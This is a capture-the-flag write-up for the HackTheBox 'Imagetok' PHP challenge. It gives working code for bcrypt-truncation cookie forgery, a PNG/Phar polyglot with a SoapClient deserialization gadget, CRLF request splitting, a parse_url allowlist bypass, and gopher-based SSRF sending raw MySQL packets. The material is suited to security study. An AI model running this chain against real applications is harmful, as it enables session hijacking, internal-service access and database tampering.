---
icon: file-image
cover: ../../.gitbook/assets/Screenshot 2026-03-31 141802.png
coverY: -29.736015084852294
---

# IMAGETOK

### Recon

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ rustscan -a 154.57.164.76 blah blah
```

```
PORT      STATE SERVICE VERSION
32273/tcp open  http    Apache httpd
| http-title: ImageTok
```

Only one port open — HTTP. Let's see what the app actually does before touching the source.

***

### Enumeration

#### Application Overview

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Visiting the target drops us on a simple image upload page. The UI says minimum size 120x120 and only accepts PNG. After uploading, it redirects to `/image/<random_hash>.png` and shows the image back at us. That's it for visible surface.

Not much here at first glance, but we have source — let's dig in.

#### Source Code Review

**`index.php` — Entrypoint**

The app sets up autoloading, a DB connection via `$_SERVER` env vars, a custom session handler, and routes:

```php
$router->new('GET', '/', 'ImageController@index');
$router->new('POST', '/upload', 'ImageController@store');
$router->new('GET', '/image/{param}', 'ImageController@show');
$router->new('POST', '/proxy', 'ProxyController@index');
$router->new('GET', '/info', function(){ return phpinfo(); });
```

Two things stand out immediately: `/proxy` is never linked in the UI, and `/info` just dumps `phpinfo()` — free intel. The `/proxy` route is going to be interesting.

**`CustomSessionHandler.php` — BCRYPT Truncation Bug**

The session is stored as a signed cookie `PHPSESSID` in the format `base64(json).base64(bcrypt_hash)`. The signing is:

```php
$signature = base64_encode(password_hash(SECRET.$json, PASSWORD_BCRYPT));
```

And verification:

```php
if (password_verify(SECRET.$data, $signature))
{
    $this->data = json_decode($data, true);
}
```

The vulnerability: **bcrypt silently truncates input at 72 bytes**. Anything beyond byte 72 is ignored during both hashing and verification. So if we can get the session JSON to exceed 72 bytes with our data before the `username` field, we can forge arbitrary `username` values — specifically `admin` — while keeping a valid signature from a legitimate session.

After uploading a file the cookie JSON looks like this:

```json
{"files":[{"file_name":"e9da8.png"}],"username":"64e47f0f9478c"}
```

The keys are alphabetically sorted (`files` before `username`). The `files` array gets longer as we upload more files. If we can push the content past 72 bytes before `username`, the bcrypt truncation means the signature is computed over the exact same truncated prefix — so we can replace `username` with `admin` and the signature still verifies. This is our session impersonation primitive.

**`ProxyController.php` — SSRF with Allowlist**

```php
if ($session->read('username') != 'admin' || $_SERVER['REMOTE_ADDR'] != '127.0.0.1')
{
    $router->abort(401);
}
```

Two gates: must be `admin`, and must come from `127.0.0.1`. The second gate means we need a way to make the app call itself. The URL goes through validation:

```php
$scheme = parse_url($url, PHP_URL_SCHEME);
$host   = parse_url($url, PHP_URL_HOST);
$port   = parse_url($url, PHP_URL_PORT);

if (!empty($scheme) && !preg_match('/^http?$/i', $scheme) ||
    !empty($host)   && !in_array($host, ['uploads.imagetok.htb','admin.imagetok.htb']) ||
    !empty($port)   && !in_array($port, ['80', '8080', '443']))
{
    $router->abort(400);
}
```

The allowlist looks tight — scheme must be `http/https`, host must be one of two values, port must be 80/8080/443. But the check uses `!empty()` — if `parse_url()` returns `null` for any component, `!empty(null)` is `false`, so the entire OR-chain short circuits to false and the block is skipped entirely. The request proceeds to `curl_exec`.

We can force `parse_url()` to return `null` across the board by feeding it a malformed URL. Specifically, adding an extra slash: `http:///hackthebox.com`. PHP's `php_url_parse_ex` hits the host validation where pointer math `(p - s) < 1` resolves true against a null pointer, causing the whole parse to return `NULL`. So `parse_url('http:///hackthebox.com')` returns `false` — all three `!empty()` checks evaluate false — filter bypassed.

But `curl_exec` still needs to parse it as a valid URL. That's fine — curl handles `gopher://` natively, and we're going to use that.

**`ImageModel.php` — Phar Deserialization Vector**

The upload flow validates images like this:

```php
public function isValidImage()
{
    $file_name = $this->file->getFileName();
    if (mime_content_type($file_name) != 'image/png') return false;
    $size = getimagesize($file_name);
    if (!$size || !($size[0] >= 120 && $size[1] >= 120) || $size[2] !== IMAGETYPE_PNG)
        return false;
    return true;
}
```

Three checks: MIME type, dimensions, PNG type. All three can be satisfied by prepending a valid PNG header and body to a Phar archive (a polyglot). The `mime_content_type` and `getimagesize` calls operate on the raw bytes if those bytes look like a PNG, both checks pass.

Now where does phar deserialization trigger? The `show` method in `ImageController` calls `getimagesize` on a user-controlled path from the URL `/image/{param}`. If we pass `phar://uploads/payload.png` as the parameter, PHP deserializes the Phar manifest metadata — which we control.

The `__destruct()` method in `ImageModel` calls `$this->file->getFileName()`. If we inject a `SoapClient` object as `$file`, PHP hits `SoapClient::__call()` when it tries to call `getFileName()` on it (since `SoapClient` has `__call` defined and `getFileName` doesn't exist on it). `SoapClient::__call` triggers an HTTP POST to whatever `location` we set.

This is our full deserialization chain: `ImageModel::__destruct()` → `SoapClient::__call()` → outbound HTTP POST.

***

### Exploitation

#### Step 1 — Confirm `php-phar` is Loaded

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ curl -s http://154.57.164.76:32273/info | grep -i phar
```

```
phar support => enabled
```

Good. Also grab DB creds from phpinfo since `/info` is open to the world:

```
$_SERVER['DB_USER']  => user_pAiTo
$_SERVER['DB_NAME']  => db_HLZo6
```

We'll need these later for the gopher MySQL payload.

#### Step 2 — Session Impersonation (BCRYPT Truncation)

Upload `makelaris.png` (a valid 120x120 PNG) repeatedly until the cookie JSON exceeds 72 bytes:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ for i in {1..5}; do curl -s -b "PHPSESSID=$SESS" -F "uploadFile=@makelaris.png" http://154.57.164.76:32273/upload; done
```

Decode the cookie and check length:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ python3 -c "
import base64, urllib.parse, json, sys
raw = urllib.parse.unquote(input('cookie: '))
data = base64.b64decode(raw.split('.')[0])
print(len(data), data)
"
```

Once it's over 72 bytes, forge the admin cookie — replace `username` with `admin`, keep the original signature:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ python3 forge_cookie.py
```

```python
import base64, json, urllib.parse

raw = urllib.parse.unquote("<YOUR_PHPSESSID_COOKIE>")
parts = raw.split('.')
data = json.loads(base64.b64decode(parts[0]))
data['username'] = 'admin'
# Re-encode with admin username - signature still valid due to bcrypt truncation
forged_b64 = base64.b64encode(json.dumps(data, separators=(',',':')).encode()).decode()
print(f"{forged_b64}.{parts[1]}")
```

The key insight: because bcrypt only hashes the first 72 bytes, the signature over the `files[...]` portion is identical whether `username` is `admin` or the original uniqid. We're just replacing bytes past the truncation boundary.

#### Step 3 — Phar Polyglot Creation

Create `createphar.php`. The `SoapClient` URI contains our CRLF-injected payload to make a second HTTP request to `/proxy`:

```php
<?php
class ImageModel {}
$image = new ImageModel('');
$image->file = new SoapClient(null, [
    'uri'      => $argv[1],
    'location' => 'http://127.0.0.1/upload'
]);

$png  = file_get_contents('makelaris.png');
$phar = new Phar('poc.phar', 0);
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($image);
$phar->setStub("${png} __HALT_COMPILER(); ?>");
rename('poc.phar', 'payload.png');
```

The `uri` parameter gets injected with CRLF sequences to terminate the initial SOAP POST and inject our own `/proxy` request. The `SoapClient` will form a raw HTTP request — we hijack it mid-stream using request splitting:

```
POST /upload HTTP/1.1\r\n
Content-Length: 0\r\n
\r\n\r\n
POST /proxy HTTP/1.1\r\n
Host: admin.imagetok.htb\r\n
Cookie: PHPSESSID=<FORGED_ADMIN_COOKIE>\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: <len>\r\n
\r\n
url=<DOUBLE_URL_ENCODED_GOPHER_PAYLOAD>\r\n\r\n
```

Build it:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ php -d phar.readonly=0 createphar.php "http://127.0.0.1/upload HTTP/1.1\r\nContent-Length:0\r\n\r\n\r\nPOST /proxy HTTP/1.1\r\nHost:admin.imagetok.htb\r\nCookie:PHPSESSID=${ADMIN_COOKIE}\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:${LEN}\r\n\r\nurl=${DOUBLE_ENCODED_GOPHER}\r\n\r\n"
```

Upload `payload.png`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ curl -s -b "PHPSESSID=$SESS" -F "uploadFile=@payload.png" http://154.57.164.76:32273/upload -v
```

```
< Location: /image/a3f91.png
```

#### Step 4 — Gopher to MySQL — Craft Raw Packets

The gopher payload needs to speak MySQL wire protocol directly. We need three raw packets: Handshake Response (auth), COM\_QUERY, and COM\_QUIT.

**Auth Response Packet** (no password since the user has none):

```python
auth_packet = {}
auth_packet["cap_flags"]  = (4, 0x8000 + 0x200 + 0x8)  # CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION | CLIENT_CONNECT_WITH_DB
auth_packet["max_size"]   = (4, 0x01000000)
auth_packet["charset"]    = (1, 0x21)                    # utf-8
auth_packet["reserved"]   = (23, 0x00)

raw = b"".join([v.to_bytes(p, "little") for p, v in auth_packet.values()])
raw += username + b"\x00"
raw += b"\x00"          # auth_response_len = 0 (no password)
raw += database + b"\x00"

header = len(raw).to_bytes(3, "little") + b"\x01"        # sequence_id = 1
auth_packet_final = header + raw
```

**COM\_QUERY Packet**:

```python
query = b"USE db_HLZo6; INSERT INTO files(file_name,checksum,username) SELECT flag,'x','admin' FROM definitely_not_a_flag"

com_query = b'\x03' + query
header    = len(com_query).to_bytes(3, "little") + b"\x00"
query_packet = header + com_query
```

**Build gopher URL** (double URL-encode since it goes through POST → curl):

```python
payload = auth_packet_final + query_packet + b"\x01\x00\x00\x00\x01"  # + COM_QUIT
gopher  = "gopher:///0:3306/_" + "".join(f"%{b:02x}" for b in payload)
# Double encode for the POST body going through proxy
final   = urllib.parse.quote(urllib.parse.quote(gopher))
```

The triple-slash `gopher:///` is our parse\_url bypass — `parse_url` returns `NULL` for all components so the allowlist check is skipped, but `curl_exec` handles it fine.

#### Step 5 — Trigger Phar Deserialization

Now fetch the uploaded phar via the `phar://` stream wrapper:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ curl -s "http://154.57.164.76:32273/image/phar%3A%2F%2Fuploads%2Fa3f91.png" -b "PHPSESSID=$SESS"
```

What happens server-side:

1. `ImageController@show` calls `getimagesize("phar://uploads/a3f91.png")`
2. PHP opens the phar stream, deserializes the metadata — our `ImageModel` object with `SoapClient` as `$file`
3. Garbage collector destroys the object, triggering `ImageModel::__destruct()`
4. `__destruct()` calls `$this->file->getFileName()` — `getFileName` doesn't exist on `SoapClient`, so `__call()` fires
5. `SoapClient::__call()` sends an HTTP POST to `http://127.0.0.1/upload` — but our CRLF injection injects a second request to `/proxy`
6. `/proxy` receives our admin cookie + gopher URL, calls `curl_exec(gopher:///0:3306/...)`
7. MySQL receives our raw auth + query packets
8. The flag gets `INSERT`ed into the `files` table under username `admin`

#### Step 6 — Retrieve the Flag

Reload the home page with our forged admin cookie:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Imagetok]
└─$ curl -s http://154.57.164.76:32273/ -b "PHPSESSID=$ADMIN_COOKIE" | python3 -c "
import sys, json, base64, urllib.parse
# parse the Set-Cookie header from response and decode
"
```

The session JSON now has the flag injected as a filename in the `files` array:

```json
{"files":[{"file_name":"HTB{ph4r_p0ly6l0t5_4nd_g0ph3r_t0_mysql_15_w1ld}"}],"username":"admin"}
```

***

### Attack Chain

```
[Recon]
  └─> /info leaks phpinfo() → DB_USER, DB_NAME exposed

[Session Impersonation]
  └─> Upload files until session JSON > 72 bytes
  └─> BCRYPT truncation: signature covers only first 72 bytes
  └─> Forge cookie with username=admin, original sig still valid

[Phar Polyglot Upload]
  └─> Craft PNG + Phar archive (polyglot)
  └─> Embed ImageModel { $file = SoapClient } in phar metadata
  └─> Passes isValidImage(): PNG header tricks mime_content_type + getimagesize

[Phar Deserialization]
  └─> GET /image/phar://uploads/payload.png
  └─> PHP deserializes manifest → ImageModel instantiated
  └─> GC fires __destruct() → calls $file->getFileName()
  └─> SoapClient::__call() triggers outbound HTTP POST

[CRLF / Request Splitting]
  └─> SoapClient URI contains \r\n injections
  └─> Terminates first POST, injects second POST to /proxy
  └─> Second request carries admin cookie + gopher payload

[parse_url Bypass]
  └─> gopher:///0:3306/... → triple slash causes parse_url() to return NULL
  └─> !empty(null) == false → all allowlist checks skipped
  └─> curl_exec still handles gopher:// fine

[SSRF → MySQL via Gopher]
  └─> Raw MySQL Handshake Response packet sent over TCP
  └─> COM_QUERY: INSERT INTO files SELECT flag FROM definitely_not_a_flag
  └─> Flag stored in files table under username=admin

[Flag Exfiltration]
  └─> Load / with forged admin cookie
  └─> Session JSON contains flag as file_name
  └─> Flag: HTB{...}
```

***

### Techniques I Used

| Technique                            | Description                                                                                                | Where Used                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------- | ------------------------------------------- |
| BCRYPT 72-byte truncation            | bcrypt ignores input past 72 bytes, enabling hash collisions                                               | Session cookie forgery to impersonate admin |
| Phar polyglot (image + archive)      | Prepend valid PNG bytes to a Phar stub to pass image validation                                            | Upload malicious Phar disguised as PNG      |
| Phar deserialization                 | PHP deserializes Phar metadata when accessed via `phar://` stream wrapper                                  | Trigger `ImageModel::__destruct()`          |
| `SoapClient::__call` gadget          | PHP's `SoapClient` fires `__call()` for undefined method calls, sending HTTP requests                      | Extend deserialization chain to SSRF        |
| CRLF / HTTP Request Splitting        | Inject `\r\n` into SoapClient URI to terminate one request and inject another                              | Pivot SOAP request into `/proxy` POST       |
| `parse_url()` triple-slash bypass    | `http:///host` causes `parse_url` to return NULL, bypassing allowlist checks via `!empty(null)` logic flaw | Bypass proxy URL validation                 |
| Gopher → MySQL (cross-protocol SSRF) | Gopher protocol sends raw TCP bytes; used to speak MySQL wire protocol                                     | Exfiltrate flag from MySQL via SSRF         |
| Raw MySQL packet crafting            | Handshake Response + COM\_QUERY packets built manually with correct byte-level encoding                    | Send unauthenticated SQL query over gopher  |
| phpinfo() information disclosure     | Open `/info` endpoint exposes env vars including DB credentials                                            | Obtain `DB_USER` and `DB_NAME`              |
